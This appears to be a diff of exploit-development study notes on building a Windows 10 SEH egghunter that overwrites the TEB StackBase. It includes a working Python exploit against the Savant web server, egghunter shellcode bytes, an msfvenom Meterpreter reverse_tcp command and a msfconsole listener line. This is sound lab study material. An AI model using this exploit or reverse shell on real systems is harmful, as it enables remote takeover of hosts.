+In addition to these 4 checks, if **SafeSEH** is enabled, every `_except_handler` function address is going to be validated by the `RtlIsValidHandle`.
+
+Our binary does not come compiled with any protections.
+
+`!nmod`
+
+```
+00400000 00452000 Savant  /SafeSEH OFF  C:\Savant\Savant.exe
+```
+
+To bypass the check, we can attempt to overwrite the `StackBase` in the `TEB` with an appropriately crafted value. It would have to be lower than the address of our `_except_handler` function, but higher than the address of our `_EXCEPTION_REGISTRATION_RECORD` structure.
+
+Our egghunter already gathers the address of the `_except_handler` function dynamically, so we could subtract a small number of bytes from it and use that to overwrite the `StackBase`.
+
+`egghunter_seh_win10.py`
+
+```python
+...
+"	build_exception_record: 				 "
+		# pop the address of the exception_handler 
+		# into ecx
+"		pop ecx 							;" 
+		# mov signature into eax
+"		mov eax, 0x74303077 				;" 
+		# push Handler of the 
+		# _EXCEPTION_REGISTRATION_RECORD structure
+"		push ecx 							;" 
+		# push Next of the 
+		# _EXCEPTION_REGISTRATION_RECORD structure
+"		push 0xffffffff 					;" 
+		# null out ebx
+"		xor ebx, ebx 						;" 
+		# overwrite ExceptionList in the TEB with a pointer 
+		# to our new _EXCEPTION_REGISTRATION_RECORD structure
+"		mov dword ptr fs:[ebx], esp 		;" 
+		# subtract 0x04 from the pointer 
+		# to exception_handler
+"		sub ecx, 0x04 						;" 
+		# add 0x04 to ebx
+"		add ebx, 0x04 						;" 
+		# overwrite the StackBase in the TEB
+"		mov dword ptr fs:[ebx], ecx 		;" 
+...
+```
+
+Our new egghunter adds some additional instructions to the `build_exception_record` function:
+
+- overwrites the `ExceptionList` from the TEB, 
+
+- subtract `0x04` from `ECX`, which still holds the address of our `_except_handler` function.
+
+- increases the value of `EBX` by `0x04` and uses that as an offset into the FS register to overwrite the `StackBase`.
+
+### Porting the SEH Egghunter to Windows 10
+
+#### SEH-based egghunter
+
+```python
+#!/usr/bin/python
+import socket
+import sys
+from struct import pack
+
+try:
+    server = sys.argv[1]
+    port = 80
+    size = 253
+
+    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
+
+    egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
+                b"\xeb\x2a\x59\xb8\x77\x30\x30\x74"
+                b"\x51\x6a\xff\x31\xdb\x64\x89\x23"
+                b"\x83\xe9\x04\x83\xc3\x04\x64\x89"
+                b"\x0b\x6a\x02\x59\x89\xdf\xf3\xaf"
+                b"\x75\x07\xff\xe7\x66\x81\xcb\xff"
+                b"\x0f\x43\xeb\xed\xe8\xd1\xff\xff"
+                b"\xff\x6a\x0c\x59\x8b\x04\x0c\xb1"
+                b"\xb8\x83\x04\x08\x06\x58\x83\xc4"
+                b"\x10\x50\x31\xc0\xc3")
+
+    inputBuffer = b"\x41" * (size - len(egghunter))
+    inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
+    httpEndRequest = b"\r\n\r\n"
+
+    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v  payload
+
+    payload =  b""
+    payload += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b"
+    ...
+    payload += b"\xff\xd5"
+
+    shellcode = b"w00tw00t" + payload + b"\x44" * (400-len(payload))
+
+    buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
+
+    print("Sending evil buffer...")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(buf)
+    s.close()
+    
+    print("Done!")
+  
+except socket.error:
+    print("Could not connect!")
+```
+
+Set a breakpoint at the `POP EAX; RET` instruction sequence, let the execution flow continue
+
+Inspect the `ExceptionList` and the `StackBase`
+
+`t`
+
+```
+03e5eabe 6a02            push    2
+```
+
+`!teb`
+
+```
+TEB at 00234000
+    ExceptionList:        03e5ea2c
+    StackBase:            03e5ead2
+    StackLimit:           03e5c000
+    SubSystemTib:         00000000
+...
+```
+
+`dt _EXCEPTION_REGISTRATION_RECORD 03e5ea2c`
+
+```
+ntdll!_EXCEPTION_REGISTRATION_RECORD
+   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
+   +0x004 Handler          : 0x03e5ead6     _EXCEPTION_DISPOSITION  +3e5ead6
+```
+
+We have successfully managed to overwrite the `StackBase` with a value that is lower than the memory address of our `_except_handler` function, but higher than the memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure.
+
+Letting the debugger continue execution will trigger the access violation. 
+
+Set a breakpoint at the `_except_handler` function to determine if overwriting the `StackBase` was enough.
+
+`g`
+
+```
+03e5eac3 f3af            repe scas dword ptr es:[edi]
+```
+
+`!exchain`
+
+```
+03e5ea2c: 03e5ead6
+Invalid exception stack at ffffffff
+```
+
+`bp 03e5ead6`
+
+`g`
+
+```
+Breakpoint 1 hit
+03e5ead6 6a0c            push    0Ch
+```
+
+`u @eip`
+
+```
+03e5ead6 6a0c            push    0Ch
+03e5ead8 59              pop     ecx
+03e5ead9 8b040c          mov     eax,dword ptr [esp+ecx]
+03e5eadc b1b8            mov     cl,0B8h
+03e5eade 83040806        add     dword ptr [eax+ecx],6
+03e5eae2 58              pop     eax
+03e5eae3 83c410          add     esp,10h
+03e5eae6 50              push    eax
+```
+
+We managed to successfully reach our `_except_handler` function.
+
+`Eip` member of the `CONTEXT` structure points to the instruction that caused the access violation (`REPE SCASD`).
+
+Remove any breakpoints and let the execution flow resume while waiting for our shell. 
+
+Unfortunately, every time we hit an unmapped memory page or one we don't have access to, we get an access violation, which halts the debugger.
+
+These can be temporarily disabled in WinDbg.
+
+To avoid stopping the execution for every "first time" exception, use the `sxd` command to disable them. This will also **disable guard pages**.
+
+`sxd av`
+
+`sxd gp`
+
+`bc *`
+
+`g`
+
+Set up a listener.
+
+```bash
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; exploit"
+```
+
+Our egghunter maintains functionality on older Windows versions such as 7 or 8.
+
+## Extra Mile
+
+```python
 
 ```
 
+# Creating Custom Shellcode
 
-```nasm
+# Reverse Engineering for Bugs
 
-```
 
 
 
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
+# Stack Overflows and DEP Bypass
 
 ```nasm
 
@@ -5650,7 +7262,7 @@ The .text section is marked as both containing executable code (IMAGE_SCN_CNT_CO
 ### Important Standard Sections
 - **.text** section typically contains executable code and is readable and executable but *not writable*.
 - **.data** section contains **initialized** variables, i.e., these variables are assigned a specific initial value at compile time. This includes global and static variables that are initialized. The values can be changed at any point during run-time. => the .data section is both readable and *writable*.
-- **.bss** section contains **uninitialized** variables, i.e., the static and global variables are not assigned a specific initial value at compile-time (to take up less space on disk). On Windows and other operating systems, the .bss section is initialized to zero in memory. Because it is set during run-time, it is both readable and *writable*, like the .data section.
+- **.bss** section contains **uninitialized** variables, i.e., the static and global variables are not assigned a specific initial value at compile-time (to take up less space on disk). On Windows and other OSs, the .bss section is initialized to zero in memory. Because it is set during run-time, it is both readable and *writable*, like the .data section.
 - **.rdata** contains **constant** initialized data and is *read-only*. This data may be constant global and static variables or many other data types.
 - **.rsrc** section contains additional resources (icons, bitmaps, menus, strings, etc.) that the image may use for things like multi-language support with each language being supported by a particular resource. This section is marked as *read-only*.
 - **.reloc** contains relocation data that helps the loader re-base the image if it cannot be loaded at its preferred base address. To do this, there must be a base relocation table, which consists of base relocation blocks. These blocks each represent a single page and contain the offsets of each memory location where re-basing must be performed and the type of re-basing that must be applied to it.
